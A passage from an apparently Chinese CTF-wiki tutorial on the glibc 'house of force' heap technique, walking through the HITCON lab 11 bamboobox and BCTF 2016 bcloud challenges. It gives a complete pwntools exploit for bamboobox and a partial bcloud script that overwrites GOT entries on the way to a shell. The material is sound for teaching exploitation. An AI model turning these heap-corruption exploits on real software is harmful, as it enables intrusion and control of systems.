<li>第三，分配的次数不能受限制</li>
</ul>
<p>其实这三点中第二点往往是最难办的，CTF 题目中往往会给用户分配堆块的大小限制最小和最大值使得不能通过HOF 的方法进行利用。</p>
</div>
<div class="section" id="hitcon-training-lab-11">
<h2>HITCON training lab 11<a class="headerlink" href="#hitcon-training-lab-11" title="永久链接至标题">¶</a></h2>
<p>这里，我们主要修改其 magic 函数为</p>
<div class="section" id="id6">
<h3>基本信息<a class="headerlink" href="#id6" title="永久链接至标题">¶</a></h3>
<div class="code shell highlight-default"><div class="highlight"><pre><span></span>➜  hitcontraning_lab11 git:(master) file bamboobox
bamboobox: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=595428ebf89c9bf7b914dd1d2501af50d47bbbe1, not stripped
➜  hitcontraning_lab11 git:(master) checksec bamboobox
[*] &#39;/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/heap/example/house_of_force/hitcontraning_lab11/bamboobox&#39;
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
</pre></div>
</div>
<p>该程序是一个 64 位的动态链接程序。</p>
</div>
<div class="section" id="id7">
<h3>基本功能<a class="headerlink" href="#id7" title="永久链接至标题">¶</a></h3>
<p>需要注意的是，该程序开始时即申请了 0x10 的内存，用来保留<strong>两个函数指针</strong>。</p>
<p>该程序大概就是对于盒子里的物品进行添加和删除</p>
<ol class="arabic simple">
<li>展示盒子里的内容，依次盒子里每一个物品的名字。</li>
<li>向盒子里添加物品，根据用户输入的大小来为每一个物品申请对应的内存，作为其存储名字的空间。但是需要注意的是，这里读取名字使用的是 <code class="docutils literal"><span class="pre">read</span></code> 函数，读取长度的参数是用户输入的 v2，而 read
的第三个参数是无符号整数，如果我们输入负数，就可以读取任意长度。但是我们需要确保该数值满足<code class="docutils literal"><span class="pre">REQUEST_OUT_OF_RANGE</span></code>
的约束，所以这里存在<strong>任意长度堆溢出</strong>的漏洞。但即使这样，第一次的时候也比较难以利用，因为初始时候堆的 top chunk 的大小一般是不会很大的。</li>
<li>修改物品的名字，根据给定的索引，以及大小，向指定索引的物品中读取指定长度名字。这里长度由用户来读入，也存在<strong>任意长度堆溢出</strong>的漏洞。</li>
<li>删除物品，将对应物品的名字的大小置为0，并将对应的 content 置为 NULL。</li>
</ol>
<p>此外，由于该程序主要是一个演示程序，所以程序中有一个 magic 函数，可以直接读取 flag。</p>
</div>
<div class="section" id="id8">
<h3>利用<a class="headerlink" href="#id8" title="永久链接至标题">¶</a></h3>
<p>由于程序中有个 magic 函数，所以我们的核心目的是覆盖某个指针为 magic 函数的指针。这里，程序在开始的时候申请了一块内存来存储两个函数指针，hello_message用于程序开始时使用，goodbye_message
用于在程序结束时使用，所以我们可以利用覆盖 goodbye_message 来控制程序执行流。具体思路如下</p>
<ol class="arabic simple">
<li>添加物品，利用堆溢出漏洞覆盖 top chunk 的大小为 -1，即 64 位最大值。</li>
<li>利用 house of force 技巧，分配 chunk 至堆的基地址。</li>
<li>覆盖 goodbye_message 为magic 函数地址来控制程序执行流</li>
</ol>
<p><strong>这里需要注意的是，在触发top chunk 转移到指定位置时，所使用的大小应该合适，以便于设置新的 top chunk 大小，从而可以绕过下一次分配top chunk 的检测。</strong></p>
<p>exp 如下</p>
<div class="code shell highlight-default"><div class="highlight"><pre><span></span><span class="ch">#!/usr/bin/env python</span>
<span class="c1"># -*- coding: utf-8 -*-</span>

<span class="kn">from</span> <span class="nn">pwn</span> <span class="k">import</span> <span class="o">*</span>

<span class="n">r</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">&#39;./bamboobox&#39;</span><span class="p">)</span>
<span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span>


<span class="k">def</span> <span class="nf">additem</span><span class="p">(</span><span class="n">length</span><span class="p">,</span> <span class="n">name</span><span class="p">):</span>
    <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;:&quot;</span><span class="p">)</span>
    <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&quot;2&quot;</span><span class="p">)</span>
    <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;:&quot;</span><span class="p">)</span>
    <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">length</span><span class="p">))</span>
    <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;:&quot;</span><span class="p">)</span>
    <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">name</span><span class="p">)</span>


<span class="k">def</span> <span class="nf">modify</span><span class="p">(</span><span class="n">idx</span><span class="p">,</span> <span class="n">length</span><span class="p">,</span> <span class="n">name</span><span class="p">):</span>
    <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;:&quot;</span><span class="p">)</span>
    <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&quot;3&quot;</span><span class="p">)</span>
    <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;:&quot;</span><span class="p">)</span>
    <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
    <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;:&quot;</span><span class="p">)</span>
    <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">length</span><span class="p">))</span>
    <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;:&quot;</span><span class="p">)</span>
    <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">name</span><span class="p">)</span>


<span class="k">def</span> <span class="nf">remove</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
    <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;:&quot;</span><span class="p">)</span>
    <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&quot;4&quot;</span><span class="p">)</span>
    <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;:&quot;</span><span class="p">)</span>
    <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>


<span class="k">def</span> <span class="nf">show</span><span class="p">():</span>
    <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;:&quot;</span><span class="p">)</span>
    <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&quot;1&quot;</span><span class="p">)</span>


<span class="n">magic</span> <span class="o">=</span> <span class="mh">0x400d49</span>
<span class="c1"># we must alloc enough size, so as to successfully alloc from fake topchunk</span>
<span class="n">additem</span><span class="p">(</span><span class="mh">0x30</span><span class="p">,</span> <span class="s2">&quot;ddaa&quot;</span><span class="p">)</span>  <span class="c1"># idx 0</span>
<span class="n">payload</span> <span class="o">=</span> <span class="mh">0x30</span> <span class="o">*</span> <span class="s1">&#39;a&#39;</span>  <span class="c1"># idx 0&#39;s content</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="s1">&#39;a&#39;</span> <span class="o">*</span> <span class="mi">8</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xffffffffffffffff</span><span class="p">)</span>  <span class="c1"># top chunk&#39;s prev_size and size</span>
<span class="c1"># modify topchunk&#39;s size to -1</span>
<span class="n">modify</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
<span class="c1"># top chunk&#39;s offset to heap base</span>
<span class="n">offset_to_heap_base</span> <span class="o">=</span> <span class="o">-</span><span class="p">(</span><span class="mh">0x40</span> <span class="o">+</span> <span class="mh">0x20</span><span class="p">)</span>
<span class="n">malloc_size</span> <span class="o">=</span> <span class="n">offset_to_heap_base</span> <span class="o">-</span> <span class="mh">0x8</span> <span class="o">-</span> <span class="mh">0xf</span>
<span class="c1">#gdb.attach(r)</span>
<span class="n">additem</span><span class="p">(</span><span class="n">malloc_size</span><span class="p">,</span> <span class="s2">&quot;dada&quot;</span><span class="p">)</span>
<span class="n">additem</span><span class="p">(</span><span class="mh">0x10</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">magic</span><span class="p">)</span> <span class="o">*</span> <span class="mi">2</span><span class="p">)</span>
<span class="nb">print</span> <span class="n">r</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
<span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</pre></div>
</div>
<p>当然，这一题也可以使用 unlink 的方法来做。</p>
</div>
</div>
<div class="section" id="bctf-bcloud">
<h2>2016 BCTF bcloud<a class="headerlink" href="#bctf-bcloud" title="永久链接至标题">¶</a></h2>
<div class="section" id="id9">
<h3>基本信息<a class="headerlink" href="#id9" title="永久链接至标题">¶</a></h3>
<div class="code shell highlight-default"><div class="highlight"><pre><span></span>➜  2016_bctf_bcloud git:(master) file bcloud
bcloud: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=96a3843007b1e982e7fa82fbd2e1f2cc598ee04e, stripped
➜  2016_bctf_bcloud git:(master) checksec bcloud
[*] &#39;/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/heap/example/house_of_force/2016_bctf_bcloud/bcloud&#39;
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
</pre></div>
</div>
<p>可以看出，这是一个动态链接的 32 位程序，主要开启了 Canary 保护与 NX 保护。</p>
</div>
<div class="section" id="id10">
<h3>基本功能<a class="headerlink" href="#id10" title="永久链接至标题">¶</a></h3>
<p>程序大概是一个云笔记管理系统。首先，程序会进行一些初始化，设置用户的名字，组织，host。程序主要有以下几个功能</p>
<ol class="arabic simple">
<li>新建note，根据用户的输入x申请x+4的空间作为note的大小。</li>
<li>展示note，啥功能也没有。。</li>
<li>编辑note，根据用户指定的 note 编辑对应的内容。</li>
<li>删除note，删除对应note。</li>
<li>同步note，标记所有的note已经被同步。</li>
</ol>
<p>然而在这五个功能中并没有发现啥漏洞，，，重新看程序，结果发现程序在初始化的时候出现了漏洞。。</p>
<p>初始化名字</p>
<div class="code c highlight-default"><div class="highlight"><pre><span></span><span class="n">unsigned</span> <span class="nb">int</span> <span class="n">init_name</span><span class="p">()</span>
<span class="p">{</span>
  <span class="n">char</span> <span class="n">s</span><span class="p">;</span> <span class="o">//</span> <span class="p">[</span><span class="n">esp</span><span class="o">+</span><span class="mi">1</span><span class="n">Ch</span><span class="p">]</span> <span class="p">[</span><span class="n">ebp</span><span class="o">-</span><span class="mi">5</span><span class="n">Ch</span><span class="p">]</span>
  <span class="n">char</span> <span class="o">*</span><span class="n">tmp</span><span class="p">;</span> <span class="o">//</span> <span class="p">[</span><span class="n">esp</span><span class="o">+</span><span class="mi">5</span><span class="n">Ch</span><span class="p">]</span> <span class="p">[</span><span class="n">ebp</span><span class="o">-</span><span class="mi">1</span><span class="n">Ch</span><span class="p">]</span>
  <span class="n">unsigned</span> <span class="nb">int</span> <span class="n">v3</span><span class="p">;</span> <span class="o">//</span> <span class="p">[</span><span class="n">esp</span><span class="o">+</span><span class="mi">6</span><span class="n">Ch</span><span class="p">]</span> <span class="p">[</span><span class="n">ebp</span><span class="o">-</span><span class="n">Ch</span><span class="p">]</span>

  <span class="n">v3</span> <span class="o">=</span> <span class="n">__readgsdword</span><span class="p">(</span><span class="mh">0x14</span><span class="n">u</span><span class="p">);</span>
  <span class="n">memset</span><span class="p">(</span><span class="o">&amp;</span><span class="n">s</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0x50</span><span class="n">u</span><span class="p">);</span>
  <span class="n">puts</span><span class="p">(</span><span class="s2">&quot;Input your name:&quot;</span><span class="p">);</span>
  <span class="n">read_str</span><span class="p">(</span><span class="o">&amp;</span><span class="n">s</span><span class="p">,</span> <span class="mi">64</span><span class="p">,</span> <span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">);</span>
  <span class="n">tmp</span> <span class="o">=</span> <span class="p">(</span><span class="n">char</span> <span class="o">*</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="mh">0x40</span><span class="n">u</span><span class="p">);</span>
  <span class="n">name</span> <span class="o">=</span> <span class="n">tmp</span><span class="p">;</span>
  <span class="n">strcpy</span><span class="p">(</span><span class="n">tmp</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">s</span><span class="p">);</span>
  <span class="n">info</span><span class="p">(</span><span class="n">tmp</span><span class="p">);</span>
  <span class="k">return</span> <span class="n">__readgsdword</span><span class="p">(</span><span class="mh">0x14</span><span class="n">u</span><span class="p">)</span> <span class="o">^</span> <span class="n">v3</span><span class="p">;</span>
<span class="p">}</span>
</pre></div>
</div>
<p>这里如果程序读入的名字为64个字符，那么当程序在使用info函数输出对应的字符串时，就会输出对应的tmp指针内容，也就是说<strong>泄露了堆的地址</strong>。。</p>
<p>初始化组织和org的时候存在漏洞</p>
<div class="code c highlight-default"><div class="highlight"><pre><span></span><span class="n">unsigned</span> <span class="nb">int</span> <span class="n">init_org_host</span><span class="p">()</span>
<span class="p">{</span>
  <span class="n">char</span> <span class="n">s</span><span class="p">;</span> <span class="o">//</span> <span class="p">[</span><span class="n">esp</span><span class="o">+</span><span class="mi">1</span><span class="n">Ch</span><span class="p">]</span> <span class="p">[</span><span class="n">ebp</span><span class="o">-</span><span class="mi">9</span><span class="n">Ch</span><span class="p">]</span>
  <span class="n">char</span> <span class="o">*</span><span class="n">v2</span><span class="p">;</span> <span class="o">//</span> <span class="p">[</span><span class="n">esp</span><span class="o">+</span><span class="mi">5</span><span class="n">Ch</span><span class="p">]</span> <span class="p">[</span><span class="n">ebp</span><span class="o">-</span><span class="mi">5</span><span class="n">Ch</span><span class="p">]</span>
  <span class="n">char</span> <span class="n">v3</span><span class="p">;</span> <span class="o">//</span> <span class="p">[</span><span class="n">esp</span><span class="o">+</span><span class="mi">60</span><span class="n">h</span><span class="p">]</span> <span class="p">[</span><span class="n">ebp</span><span class="o">-</span><span class="mi">58</span><span class="n">h</span><span class="p">]</span>
  <span class="n">char</span> <span class="o">*</span><span class="n">v4</span><span class="p">;</span> <span class="o">//</span> <span class="p">[</span><span class="n">esp</span><span class="o">+</span><span class="n">A4h</span><span class="p">]</span> <span class="p">[</span><span class="n">ebp</span><span class="o">-</span><span class="mi">14</span><span class="n">h</span><span class="p">]</span>
  <span class="n">unsigned</span> <span class="nb">int</span> <span class="n">v5</span><span class="p">;</span> <span class="o">//</span> <span class="p">[</span><span class="n">esp</span><span class="o">+</span><span class="n">ACh</span><span class="p">]</span> <span class="p">[</span><span class="n">ebp</span><span class="o">-</span><span class="n">Ch</span><span class="p">]</span>

  <span class="n">v5</span> <span class="o">=</span> <span class="n">__readgsdword</span><span class="p">(</span><span class="mh">0x14</span><span class="n">u</span><span class="p">);</span>
  <span class="n">memset</span><span class="p">(</span><span class="o">&amp;</span><span class="n">s</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0x90</span><span class="n">u</span><span class="p">);</span>
  <span class="n">puts</span><span class="p">(</span><span class="s2">&quot;Org:&quot;</span><span class="p">);</span>
  <span class="n">read_str</span><span class="p">(</span><span class="o">&amp;</span><span class="n">s</span><span class="p">,</span> <span class="mi">64</span><span class="p">,</span> <span class="mi">10</span><span class="p">);</span>
  <span class="n">puts</span><span class="p">(</span><span class="s2">&quot;Host:&quot;</span><span class="p">);</span>
  <span class="n">read_str</span><span class="p">(</span><span class="o">&amp;</span><span class="n">v3</span><span class="p">,</span> <span class="mi">64</span><span class="p">,</span> <span class="mi">10</span><span class="p">);</span>
  <span class="n">v4</span> <span class="o">=</span> <span class="p">(</span><span class="n">char</span> <span class="o">*</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="mh">0x40</span><span class="n">u</span><span class="p">);</span>
  <span class="n">v2</span> <span class="o">=</span> <span class="p">(</span><span class="n">char</span> <span class="o">*</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="mh">0x40</span><span class="n">u</span><span class="p">);</span>
  <span class="n">org</span> <span class="o">=</span> <span class="n">v2</span><span class="p">;</span>
  <span class="n">host</span> <span class="o">=</span> <span class="n">v4</span><span class="p">;</span>
  <span class="n">strcpy</span><span class="p">(</span><span class="n">v4</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">v3</span><span class="p">);</span>
  <span class="n">strcpy</span><span class="p">(</span><span class="n">v2</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">s</span><span class="p">);</span>
  <span class="n">puts</span><span class="p">(</span><span class="s2">&quot;OKay! Enjoy:)&quot;</span><span class="p">);</span>
  <span class="k">return</span> <span class="n">__readgsdword</span><span class="p">(</span><span class="mh">0x14</span><span class="n">u</span><span class="p">)</span> <span class="o">^</span> <span class="n">v5</span><span class="p">;</span>
<span class="p">}</span>
</pre></div>
</div>
<p>当读入组织时，给定 64 字节，会覆盖 v2 的低地址。与此同时，我们可以知道 v2 是与 top chunk 相邻的 chunk，而 v2 恰好与 org 相邻，那么由于在 32 位程序中，一般都是 32 位全部都使用，这里 v2
所存储的内容，几乎很大程度上都不是 <code class="docutils literal"><span class="pre">\x00</span></code> ，所以当执行 strcpy 函数向 v2 中拷贝内容时，很有可能会覆盖top chunk。这就是漏洞所在。</p>
</div>
<div class="section" id="id11">
<h3>利用<a class="headerlink" href="#id11" title="永久链接至标题">¶</a></h3>
<ol class="arabic simple">
<li>利用初始化名字处的漏洞泄漏堆的基地址。。</li>
<li>利用 house of force 将 top chunk 分配至全局的 0x0804B0A0 的 &amp;notesize-8 处，当再次申请内存时，便返回notesize地址处的内存，从而我们就可以控制所有note的大小以及对应的地址了。</li>
<li>修改前三个 note 的大小为16，并修改其指针为 <a class="reference external" href="mailto:free&#37;&#52;&#48;got">free<span>&#64;</span>got</a>，<a class="reference external" href="mailto:atoi&#37;&#52;&#48;got">atoi<span>&#64;</span>got</a>，<a class="reference external" href="mailto:atoi&#37;&#52;&#48;got">atoi<span>&#64;</span>got</a></li>
<li>将 <a class="reference external" href="mailto:free&#37;&#52;&#48;got">free<span>&#64;</span>got</a> 修改为 <a class="reference external" href="mailto:puts&#37;&#52;&#48;plt">puts<span>&#64;</span>plt</a>。</li>
<li>泄漏 atoi 地址。</li>
<li>再次修改另外一个 atoi got 项为 system 地址，从而拿到shell。</li>
</ol>
<p>具体脚本如下</p>
<div class="code python highlight-default"><div class="highlight"><pre><span></span><span class="kn">from</span> <span class="nn">pwn</span> <span class="k">import</span> <span class="o">*</span>
<span class="n">context</span><span class="o">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;gnome-terminal&#39;</span><span class="p">,</span> <span class="s1">&#39;-x&#39;</span><span class="p">,</span> <span class="s1">&#39;sh&#39;</span><span class="p">,</span> <span class="s1">&#39;-c&#39;</span><span class="p">]</span>
<span class="k">if</span> <span class="n">args</span><span class="p">[</span><span class="s1">&#39;DEBUG&#39;</span><span class="p">]:</span>
    <span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span>
<span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="s2">&quot;./bcloud&quot;</span>
<span class="n">bcloud</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&quot;./bcloud&quot;</span><span class="p">)</span>
<span class="k">if</span> <span class="n">args</span><span class="p">[</span><span class="s1">&#39;REMOTE&#39;</span><span class="p">]:</span>
    <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;127.0.0.1&#39;</span><span class="p">,</span> <span class="mi">7777</span><span class="p">)</span>
<span class="k">else</span><span class="p">:</span>
    <span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s2">&quot;./bcloud&quot;</span><span class="p">)</span>
<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s1">&#39;PID: &#39;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">proc</span><span class="o">.</span><span class="n">pidof</span><span class="p">(</span><span class="n">p</span><span class="p">)[</span><span class="mi">0</span><span class="p">]))</span>
<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./libc.so.6&#39;</span><span class="p">)</span>


<span class="k">def</span> <span class="nf">offset_bin_main_arena</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
    <span class="n">word_bytes</span> <span class="o">=</span> <span class="n">context</span><span class="o">.</span><span class="n">word_size</span> <span class="o">/</span> <span class="mi">8</span>
    <span class="n">offset</span> <span class="o">=</span> <span class="mi">4</span>  <span class="c1"># lock</span>
    <span class="n">offset</span> <span class="o">+=</span> <span class="mi">4</span>  <span class="c1"># flags</span>
    <span class="n">offset</span> <span class="o">+=</span> <span class="n">word_bytes</span> <span class="o">*</span> <span class="mi">10</span>  <span class="c1"># offset fastbin</span>
    <span class="n">offset</span> <span class="o">+=</span> <span class="n">word_bytes</span> <span class="o">*</span> <span class="mi">2</span>  <span class="c1"># top,last_remainder</span>
    <span class="n">offset</span> <span class="o">+=</span> <span class="n">idx</span> <span class="o">*</span> <span class="mi">2</span> <span class="o">*</span> <span class="n">word_bytes</span>  <span class="c1"># idx</span>
    <span class="n">offset</span> <span class="o">-=</span> <span class="n">word_bytes</span> <span class="o">*</span> <span class="mi">2</span>  <span class="c1"># bin overlap</span>
    <span class="k">return</span> <span class="n">offset</span>


<span class="k">def</span> <span class="nf">exp</span><span class="p">():</span>
    <span class="c1"># leak heap base</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s1">&#39;Input your name:</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">,</span> <span class="s1">&#39;a&#39;</span> <span class="o">*</span> <span class="mi">64</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;Hey &#39;</span> <span class="o">+</span> <span class="s1">&#39;a&#39;</span> <span class="o">*</span> <span class="mi">64</span><span class="p">)</span>
    <span class="c1"># sub name&#39;s chunk&#39; s header</span>
    <span class="n">heap_base</span> <span class="o">=</span> <span class="n">u32</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">4</span><span class="p">))</span> <span class="o">-</span> <span class="mi">8</span>
    <span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s1">&#39;heap_base: &#39;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">heap_base</span><span class="p">))</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s1">&#39;Org:</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">,</span> <span class="s1">&#39;a&#39;</span> <span class="o">*</span> <span class="mi">64</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">&#39;Host:</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">,</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0xffffffff</span><span class="p">))</span>
    <span class="c1"># name,org,host, for each is (0x40+8)</span>
    <span class="n">topchunk_addr</span> <span class="o">=</span> <span class="n">heap_base</span> <span class="o">+</span> <span class="p">(</span><span class="mh">0x40</span> <span class="o">+</span> <span class="mi">8</span><span class="p">)</span> <span class="o">*</span> <span class="mi">3</span>

    <span class="c1"># make topchunk point to 0x0804B0A0-8</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">&#39;option---&gt;&gt;&#39;</span><span class="p">,</span> <span class="s1">&#39;1&#39;</span><span class="p">)</span>
    <span class="n">notesize_addr</span> <span class="o">=</span> <span class="mh">0x0804B0A0</span>
    <span class="n">notelist_addr</span> <span class="o">=</span> <span class="mh">0x0804B120</span>
    <span class="n">targetaddr</span> <span class="o">=</span> <span class="n">notesize_addr</span> <span class="o">-</span> <span class="mi">8</span>
    <span class="n">offset_target_top</span> <span class="o">=</span> <span class="n">targetaddr</span> <span class="o">-</span> <span class="n">topchunk_addr</span>
    <span class="c1"># 4 for size_t, 7 for malloc_allign</span>
    <span class="n">malloc_size</span> <span class="o">=</span> <span class="n">offset_target_top</span> <span class="o">-</span> <span class="mi">4</span> <span class="o">-</span> <span class="mi">7</span>
    <span class="c1"># plus 4 because malloc(v2 + 4);</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">&#39;Input the length of the note content:</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">,</span>
                    <span class="nb">str</span><span class="p">(</span><span class="n">malloc_size</span> <span class="o">-</span> <span class="mi">4</span><span class="p">))</span>
    <span class="c1"># most likely malloc_size-4&lt;0...</span>
    <span class="k">if</span> <span class="n">malloc_size</span> <span class="o">-</span> <span class="mi">4</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">:</span>
        <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">&#39;Input the content:</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">)</span>

    <span class="c1">#gdb.attach(p)</span>
    <span class="c1"># set notesize[0] = notesize[1] = notesize[2]=16</span>
    <span class="c1"># set notelist[0] = free@got, notelist[1]= notelist[2]=atoi@got</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">&#39;option---&gt;&gt;&#39;</span><span class="p">,</span> <span class="s1">&#39;1&#39;</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">&#39;Input the length of the note content:</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="mi">1000</span><span class="p">))</span>

    <span class="n">payload</span> <span class="o">=</span> <span class="n">p32</span><span class="p">(</span><span class="mi">16</span><span class="p">)</span> <span class="o">*</span> <span class="mi">3</span> <span class="o">+</span> <span class="p">(</span><span class="n">notelist_addr</span> <span class="o">-</span> <span class="n">notesize_addr</span> <span class="o">-</span> <span class="mi">12</span><span class="p">)</span> <span class="o">*</span> <span class="s1">&#39;a&#39;</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span>
        <span class="n">bcloud</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;free&#39;</span><span class="p">])</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">bcloud</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;atoi&#39;</span><span class="p">])</span> <span class="o">*</span> <span class="mi">2</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">&#39;Input the content:</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>

    <span class="c1"># overwrite free@got with puts@plt</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">&#39;option---&gt;&gt;&#39;</span><span class="p">,</span> <span class="s1">&#39;3&#39;</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">&#39;Input the id:</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="mi">0</span><span class="p">))</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">&#39;Input the new content:</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">,</span> <span class="n">p32</span><span class="p">(</span><span class="n">bcloud</span><span class="o">.</span><span class="n">plt</span><span class="p">[</span><span class="s1">&#39;puts&#39;</span><span class="p">]))</span>

    <span class="c1"># leak atoi addr by fake free</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">&#39;option---&gt;&gt;&#39;</span><span class="p">,</span> <span class="s1">&#39;4&#39;</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">&#39;Input the id:</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="mi">1</span><span class="p">))</span>
    <span class="n">atoi_addr</span> <span class="o">=</span> <span class="n">u32</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">4</span><span class="p">))</span>
